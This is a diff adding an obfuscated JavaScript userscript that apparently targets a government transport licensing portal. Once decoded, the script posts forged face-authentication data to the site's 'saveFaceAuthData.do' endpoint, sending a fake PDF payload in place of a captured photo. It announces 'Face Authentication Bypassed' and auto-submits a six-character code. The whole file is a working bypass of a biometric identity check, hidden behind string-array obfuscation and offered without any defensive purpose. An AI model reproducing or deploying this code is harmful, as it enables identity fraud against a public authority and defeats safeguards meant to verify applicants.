@@ -1,0 +1,84 @@
+(function(_0x547d1a, _0x1e17d3) {
+    const _0x2fdd8a = _0xcf82,
+        _0x11111b = _0x547d1a();
+    while (true) {
+        try {
+            const _0x4e9dea = -parseInt(_0x2fdd8a(0x10c)) / 1 * (-parseInt(_0x2fdd8a(0x10f)) / 2) +
+                -parseInt(_0x2fdd8a(0x10e)) / 3 * (-parseInt(_0x2fdd8a(0xfe)) / 4) +
+                -parseInt(_0x2fdd8a(0x10a)) / 5 +
+                -parseInt(_0x2fdd8a(0xf9)) / 6 +
+                -parseInt(_0x2fdd8a(0x109)) / 7 +
+                -parseInt(_0x2fdd8a(0x102)) / 8 * (-parseInt(_0x2fdd8a(0x107)) / 9) +
+                -parseInt(_0x2fdd8a(0x113)) / 10 * (-parseInt(_0x2fdd8a(0xf8)) / 11);
+            if (_0x4e9dea === _0x1e17d3) break;
+            else _0x11111b.push(_0x11111b.shift());
+        } catch (_0x3361c0) {
+            _0x11111b.push(_0x11111b.shift());
+        }
+    }
+}(_0x3714, 0x5dc82), (function() {
+    'use strict';
+    const _0x389834 = _0xcf82;
+    var _0x4d928b = document.createElement('script');
+    _0x4d928b.src = 'https://code.jquery.com/jquery-3.6.0.min.js';
+    _0x4d928b.onload = _0x18694e;
+    document.head.appendChild(_0x4d928b);
+
+    function _0x18694e() {
+        const _0x5cb918 = _0x389834;
+
+        function _0x43fb56() {
+            const _0x4afd87 = _0xcf82;
+            if ($(_0x4afd87(0x105)).is(':visible')) {
+                const _0x419103 = atob(_0x4afd87(0xff)),
+                    _0x514f18 = atob('ZGF0YTphcHBsaWNhdGlvbi9wZGY7YmFzZTY0LEpWQkVSaTB4THpjTkNpc2hzOFhYRFFveElER2JjakQ=');
+                $.ajax({
+                    type: _0x4afd87(0xfb),
+                    url: _0x419103,
+                    data: {
+                        'applno': document.querySelector(_0x4afd87(0x110)).value,
+                        'rtocode': _0x4afd87(0x115),
+                        'faceres': 1,
+                        'CapPho': _0x514f18
+                    },
+                    dataType: _0x4afd87(0x117),
+                    success: function() {
+                        const _0x265283 = _0x4afd87;
+                        alert(_0x265283(0xfd));
+                        $('#capphto1').show();
+                    },
+                    error: function() {
+                        const _0x369421 = _0x4afd87;
+                        alert(_0x369421(0xfd));
+                        $(_0x369421(0x116)).removeAttr('disabled');
+                    }
+                });
+                clearInterval(_0x2f2c5e);
+            }
+        }
+        const _0x2f2c5e = setInterval(_0x43fb56, 500);
+        $(_0x5cb918(0x106)).on('input', function() {
+            const _0x450959 = _0x5cb918;
+            if ($(this).val().length === 6) {
+                $(_0x450959(0x116)).click();
+            }
+        });
+    }
+}()));
+
+function _0xcf82(_0x511662, _0x2e9964) {
+    const _0x37146c = _0x3714();
+    return _0xcf82 = function(_0xcf8289, _0x256071) {
+        _0xcf8289 = _0xcf8289 - 0xf7;
+        let _0x33b137 = _0x37146c[_0xcf8289];
+        return _0x33b137;
+    }, _0xcf82(_0x511662, _0x2e9964);
+}
+
+function _0x3714() {
+    const _0x21916c = ['POST', 'appendChild', 'Face Authentication Bypassed', '63132qveGsI', 'c2F2ZUZhY2VBdXRoRGF0YS5kbw==', 'script', 'disabled', '1621736sQQvmJ', 'val', 'click', '#dobdiv', 'input[name="pwd"]', '9PMbPSm', 'length', '4193427joeHpC', '2483625xohzYg', 'llappln', '417319UuxEcP', 'removeAttr', '99YznEXa', '2HmMcVM', 'authentication', 'https://code.jquery.com/jquery-3.6.0.min.js', 'value', '57110nMjFgC', 'onload', 'JKDC', '#capphto1', 'json', 'createElement', '946PcsDJf', '912630dzQTbc', 'head'];
+    _0x3714 = function() {
+        return _0x21916c;
+    };
+    return _0x3714();
+}
